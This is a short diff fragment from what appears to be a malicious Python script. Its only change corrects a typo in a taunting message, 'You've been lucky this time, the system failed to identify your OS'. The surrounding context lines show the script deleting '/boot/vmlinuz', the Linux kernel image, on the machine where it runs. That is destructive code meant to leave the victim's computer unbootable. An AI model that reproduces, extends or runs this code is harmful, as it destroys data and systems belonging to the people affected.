@@ -20,4 +20,4 @@ elif x != fuckme:
     elif os.path.exists("/boot/vmlinuz"):
         os.remove("/boot/vmlinuz")
 else:
-    print("You've been ucky this time, the system failed to identify your OS")
+    print("You've been lucky this time, the system failed to identify your OS")
